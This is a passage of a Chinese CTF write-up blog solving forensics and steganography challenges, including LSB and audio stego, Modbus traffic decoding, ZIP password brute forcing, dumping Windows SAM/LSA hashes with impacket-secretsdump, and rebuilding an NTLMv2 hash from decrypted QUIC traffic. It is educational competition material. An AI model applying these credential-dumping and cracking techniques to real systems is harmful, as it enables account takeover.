</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=n>b1</span> <span class=o>^</span> <span class=n>g2</span>
</span></span><span class=line><span class=cl>            <span class=n>a</span> <span class=o>=</span> <span class=n>a1</span> <span class=o>^</span> <span class=n>r2</span>
</span></span><span class=line><span class=cl>            <span class=n>img3</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>),(</span><span class=n>r</span><span class=p>,</span><span class=n>g</span><span class=p>,</span><span class=n>b</span><span class=p>,</span><span class=n>a</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>img3</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>img3</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s2>&#34;ori.png&#34;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828104214940.png alt=/posts/bb1da35/imgs/image-20250828104214940.png height=1100 width=1762></p><h2 class=heading-element id=题目名称-base_2><span>题目名称 base_2</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-base_2 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>附件给了以下这张PNG，010打开发现末尾藏了一个ZIP压缩包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828115022552.png alt=/posts/bb1da35/imgs/image-20250828115022552.png height=886 width=1416></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828115106700.png alt=/posts/bb1da35/imgs/image-20250828115106700.png height=1836 width=2810></p><p>提取出来解压，得到一个xor文件，内容是base64编码的字符串</p><p>zsteg扫一下png，得到一串字符，长度刚刚好是32位</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828115217348.png alt=/posts/bb1da35/imgs/image-20250828115217348.png height=1110 width=2050></p><p>使用Cyberchef解码base64然后异或一下上面这个字符串即可得到一堆base32字符串</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828115255687.png alt=/posts/bb1da35/imgs/image-20250828115255687.png height=1836 width=2798></p><p>最后解base32隐写即可得到最后的flag: <code>DASCTF{e738d5d58f8e231f0523b768558cc959}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250828115400614.png alt=/posts/bb1da35/imgs/image-20250828115400614.png height=1218 width=1494></p><h2 class=heading-element id=题目名称-deep-with-deep><span>题目名称 deep-with-deep</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-deep-with-deep class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个 wav 文件，元数据中提示了密码是 deep</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831225722108.png alt=/posts/bb1da35/imgs/image-20250831225722108.png height=1176 width=2050></p><p>结合题目名称和 wav，很容易联想到是 deepsound</p><p>输入密钥解密即可得到一张 png 图片</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831225904252.png alt=/posts/bb1da35/imgs/image-20250831225904252.png height=1194 width=1588></p><p>用 stegsolve 打开刚刚得到的 PNG，发现 Alpha Plane 2 有 LSB 隐写的痕迹</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831230055487.png alt=/posts/bb1da35/imgs/image-20250831230055487.png height=1290 width=1990></p><p>因此我们写个脚本提取一下即可：<code>flag{225f667d9243201a6b2b35e008ebe3d3}</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;deep.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span><span class=n>h</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>400</span><span class=p>,</span><span class=mi>401</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=p>,</span><span class=n>g</span><span class=p>,</span><span class=n>b</span><span class=p>,</span><span class=n>a</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=c1># if a!=255:</span>
</span></span><span class=line><span class=cl>            <span class=c1>#     print(a,(x,y))</span>
</span></span><span class=line><span class=cl>            <span class=c1>#     break</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>a</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>res</span> <span class=o>+=</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>res</span> <span class=o>+=</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>     
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>func1</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831231637620.png alt=/posts/bb1da35/imgs/image-20250831231637620.png height=1426 width=2494></p><h2 class=heading-element id=题目名称-python_jail><span>题目名称 python_jail</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-python_jail class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目所给附件如下</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831231949303.png alt=/posts/bb1da35/imgs/image-20250831231949303.png height=1010 width=2078></p><p>依次解密零宽和 whitespace 隐写即可得到压缩包解压密码：<code>a8e15220-7404-4269-812e-6418557b7dc2</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831232032459.png alt=/posts/bb1da35/imgs/image-20250831232032459.png height=374 width=1456></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831232044134.png alt=/posts/bb1da35/imgs/image-20250831232044134.png height=1518 width=1888></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831232154057.png alt=/posts/bb1da35/imgs/image-20250831232154057.png height=1438 width=2494></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831232321966.png alt=/posts/bb1da35/imgs/image-20250831232321966.png height=1264 width=1944></p><p>解压后可以得到一张 PNG 图片，并且 PNG 图片 LSB 隐写了一个 python3.9 打包的 pyc 文件</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831232555879.png alt=/posts/bb1da35/imgs/image-20250831232555879.png height=1114 width=2050></p><p>直接导出然后用 pccdc 反编译一下即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>zsteg -e <span class=s2>&#34;b1,rgb,lsb,xy&#34;</span> SECRET1.png &gt; 1.pyc</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831233012985.png alt=/posts/bb1da35/imgs/image-20250831233012985.png height=392 width=2110></p><p>最后解个 base64 即可得到最后的 flag：<code>flag{b5bcfc87-5ca6-43f1-b384-57d09b886ca9}</code></p><h2 class=heading-element id=题目名称-bus><span>题目名称 bus</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-bus class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个<code>bus.cap</code>，Linux下 file 一下发现是 pcap 文件，直接 wireshark 打开</p><p>发现主要是 modbus 流量</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831222911936.png alt=/posts/bb1da35/imgs/image-20250831222911936.png height=1660 width=2690></p><p>稍微翻看一下流量包，发现一共就两种操作：读保持寄存器、写单个寄存器</p><p>因此我们可以按照顺序去查看 读保持寄存器 时的内容</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831223301033.png alt=/posts/bb1da35/imgs/image-20250831223301033.png height=1742 width=2846></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831223331278.png alt=/posts/bb1da35/imgs/image-20250831223331278.png height=1742 width=2846></p><p>主要关注上面两个包，解码第一个可以得到密钥：<code>flag{nononononononononono_this_is_key}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831223909400.png alt=/posts/bb1da35/imgs/image-20250831223909400.png height=1740 width=2798></p><p>然后解第二个流量包，发现解出来的密文是 40 字节，但是上面密钥是 38 字节</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831223832223.png alt=/posts/bb1da35/imgs/image-20250831223832223.png height=1744 width=2798></p><p>仔细观察密钥，发现出题人填充了很多个 nonono，猜测可能是故意调整到这个长度</p><p>然后注意到密文前后都有个 0x2d，删除后刚刚好和密钥的长度对上，都是 38 字节</p><p>最后异或一下，再 ROT47 解码即可得到最后的 flag：<code>flag{25b3318b9651cc7f3af666343614142e}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250831224226272.png alt=/posts/bb1da35/imgs/image-20250831224226272.png height=1748 width=2798></p><h2 class=heading-element id=题目名称-att><span>题目名称 att</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-att class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个压缩包，打开查看，很明显提示了明文攻击</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250911201639523.png alt=/posts/bb1da35/imgs/image-20250911201639523.png height=1010 width=2168></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250911201453298.png alt=/posts/bb1da35/imgs/image-20250911201453298.png height=517 width=1734></p><p>解压后得到一个加密的压缩包，尝试弱密码爆破得到解压密码：<code>123456</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250911201518426.png alt=/posts/bb1da35/imgs/image-20250911201518426.png height=517 width=1698></p><p>解压后得到 flag.txt，内容如下：</p><blockquote><p>INalVNrhVMK3WMa7XMqB2F2FuSbo+</p></blockquote><p>XXencode 解码即可得到最后的 flag : <code>flag{aaabbbcccDDDzz}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250911201833891.png alt=/posts/bb1da35/imgs/image-20250911201833891.png height=196 width=810></p><h2 class=heading-element id=题目名称-你知道我的密码吗><span>题目名称 你知道我的密码吗？</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e4%bd%a0%e7%9f%a5%e9%81%93%e6%88%91%e7%9a%84%e5%af%86%e7%a0%81%e5%90%97 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了以下三个文件，猜测需要我们从这三个文件中恢复密码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250911222018399.png alt=/posts/bb1da35/imgs/image-20250911222018399.png height=1010 width=2168></p><p>结合文件名搜索到如下这篇文章：</p><p><a href=https://www.bordergate.co.uk/extracting-windows-credentials-using-native-tools/ target=_blank rel="external nofollow noopener noreferrer">https://www.bordergate.co.uk/extracting-windows-credentials-using-native-tools/</a></p><p>直接在 Kali-Linux 里用 impacket-secretsdump 导出 hash 即可</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250911222509582.png alt=/posts/bb1da35/imgs/image-20250911222509582.png height=1836 width=2816></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ impacket-secretsdump -sam <span class=s1>&#39;./sam&#39;</span> -system <span class=s1>&#39;./sys&#39;</span> -security <span class=s1>&#39;./security&#39;</span> LOCAL
</span></span><span class=line><span class=cl>Impacket v0.12.0.dev1 - Copyright <span class=m>2023</span> Fortra
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Target system bootKey: 0xb503ddc9ee9d7745dea270d29a317d21
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping <span class=nb>local</span> SAM hashes <span class=o>(</span>uid:rid:lmhash:nthash<span class=o>)</span>
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:124c1eb810a265ea0eb2b12fe814c070:::
</span></span><span class=line><span class=cl>Admin:1001:aad3b435b51404eeaad3b435b51404ee:ad70819c5bc807280974d80f45982011:::
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping cached domain logon information <span class=o>(</span>domain/username:hash<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping LSA Secrets
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> DPAPI_SYSTEM 
</span></span><span class=line><span class=cl>dpapi_machinekey:0x0d1b5bdfc8d33c4fab65c842bddae69beca945b0
</span></span><span class=line><span class=cl>dpapi_userkey:0xb55e67d132394e16d9678c344feb238628eef222
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> L<span class=nv>$_SQSA_S</span>-1-5-21-2002660762-2776537960-2635005223-1001 
</span></span><span class=line><span class=cl>Security Questions <span class=k>for</span> user S-1-5-21-2002660762-2776537960-2635005223-1001: 
</span></span><span class=line><span class=cl> - Version : <span class=m>1</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Question: 你出生城市的名称是什么?
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=p>|</span>--&gt; Answer: ht
</span></span><span class=line><span class=cl> <span class=p>|</span> Question: 你孩童时期的昵称是什么?
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=p>|</span>--&gt; Answer: ff
</span></span><span class=line><span class=cl> <span class=p>|</span> Question: 你的母校名称是什么?
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=p>|</span>--&gt; Answer: cz
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NL<span class=nv>$KM</span> 
</span></span><span class=line><span class=cl> <span class=m>0000</span>   DF 8C 5F <span class=m>63</span> 8E BD <span class=m>17</span> <span class=m>89</span>  B0 A1 0E A1 0A 4D <span class=m>53</span> <span class=m>50</span>   .._c.........MSP
</span></span><span class=line><span class=cl> <span class=m>0010</span>   <span class=m>03</span> <span class=m>92</span> <span class=m>03</span> AD <span class=m>36</span> FC E2 <span class=m>89</span>  <span class=m>67</span> <span class=m>93</span> <span class=m>63</span> <span class=m>27</span> B1 C4 4F E2   ....6...g.c<span class=err>&#39;</span>..O.
</span></span><span class=line><span class=cl> <span class=m>0020</span>   <span class=m>79</span> <span class=m>82</span> BD F3 <span class=m>98</span> <span class=m>91</span> <span class=m>78</span> B1  C0 <span class=m>22</span> <span class=m>73</span> A9 DF B9 7C B4   y.....x..<span class=s2>&#34;s...|.
</span></span></span><span class=line><span class=cl><span class=s2> 0030   56 F9 9D 84 82 FA 8A 0C  9E 9E 31 19 6C 85 40 9C   V.........1.l.@.
</span></span></span><span class=line><span class=cl><span class=s2>NL</span><span class=nv>$KM</span><span class=s2>:df8c5f638ebd1789b0a10ea10a4d5350039203ad36fce28967936327b1c44fe27982bdf3989178b1c02273a9dfb97cb456f99d8482fa8a0c9e9e31196c85409c
</span></span></span><span class=line><span class=cl><span class=s2>[*] RasDialParams!S-1-5-21-2002660762-2776537960-2635005223-1001#0 
</span></span></span><span class=line><span class=cl><span class=s2> 0000   32 00 33 00 32 00 35 00  33 00 35 00 37 00 31 00   2.3.2.5.3.5.7.1.
</span></span></span><span class=line><span class=cl><span class=s2> 0010   38 00 00 00 31 00 36 00  30 00 38 00 00 00 36 00   8...1.6.0.8...6.
</span></span></span><span class=line><span class=cl><span class=s2> 0020   31 00 00 00 00 00 2A 00  00 00 73 00 32 00 30 00   1.....*...s.2.0.
</span></span></span><span class=line><span class=cl><span class=s2> 0030   31 00 34 00 31 00 34 00  30 00 33 00 31 00 33 00   1.4.1.4.0.3.1.3.
</span></span></span><span class=line><span class=cl><span class=s2> 0040   30 00 00 00 00 00 00 00  31 00 00 00 00 00         0.......1.....
</span></span></span><span class=line><span class=cl><span class=s2>RasDialParams!S-1-5-21-2002660762-2776537960-2635005223-1001#0:32003300320035003300350037003100380000003100360030003800000036003100000000002a000000730032003000310034003100340030003300310033003000000000000000310000000000
</span></span></span><span class=line><span class=cl><span class=s2>[*] Cleaning up...</span></span></span></code></pre></td></tr></table></div></div><blockquote><p>这里网上也有直接单独用 secretsdump.py 提取的，但是我这里没成功</p></blockquote><p>提取出来后用 hashcat 爆破或者在线网站查询即可</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250911222711072.png alt=/posts/bb1da35/imgs/image-20250911222711072.png height=1256 width=1788></p><p>这个 <code>31d6cfe0d16ae931b73c59d7e0c089c0</code> 爆破出来是空密码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250911222733560.png alt=/posts/bb1da35/imgs/image-20250911222733560.png height=1274 width=1760></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250911222904183.png alt=/posts/bb1da35/imgs/image-20250911222904183.png height=1750 width=2792></p><p>因为缺少题面信息，不知道 flag 要求的具体格式，但是我们已经得到了 Admin 用户的密码：<code>123qwe</code></p><p>后来和比赛承办方确认了flag就是得到密码的md5值：<code>46f94c8de14fb36680850768ff1b7f2a</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251020162546784.jpeg alt=/posts/bb1da35/imgs/image-20251020162546784.jpeg height=314 width=1248></p><h2 class=heading-element id=题目名称-strangesystem2024数据安全产业人才积分争夺赛><span>题目名称 Strangesystem（2024数据安全产业人才积分争夺赛）</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-strangesystem2024%e6%95%b0%e6%8d%ae%e5%ae%89%e5%85%a8%e4%ba%a7%e4%b8%9a%e4%ba%ba%e6%89%8d%e7%a7%af%e5%88%86%e4%ba%89%e5%a4%ba%e8%b5%9b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个pcap流量包，翻看一下发现主要是HTTP和QUIC的流量，并且追踪HTTP流发现如下内容</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250913094934461.png alt=image-20250913094934461 height=1187 width=1675></p><p>传了一张PNG，并且末尾藏了一个ZIP压缩包以及TLS的sslkey.log文件</p><p>其中ZIP压缩包是加密的，猜测是需要我们从加密的TLS流量中获得压缩包的解压密码</p><p>因此我们尝试提取并把这三个文件分离开来，然后把sslkey.log导入</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250913095236590.png alt=image-20250913095236590 height=1187 width=1675></p><p>这时候我们就能看到解密后的QUIC流量的内容了，可以得到如下关键信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>username</span><span class=o>=</span>admin<span class=p>&amp;</span><span class=nv>password</span><span class=o>=</span>QUICAUTH-CCC123!@#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>admin::SecretServer:d158262017948de9:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000</span></span></code></pre></td></tr></table></div></div><p>发现第二部分的内容是一个 NTLMv2 Hash</p><p>一个正常的 NTLMv2 Hash 格式应该是：<code>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</code></p><p>但是很明显这里的 <code>NTproofstring</code>有问题，因为都是xxx，猜测需要我们去恢复这个</p><p>参考网上NTLM认证协议中的密钥派生过程，写个脚本生成一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
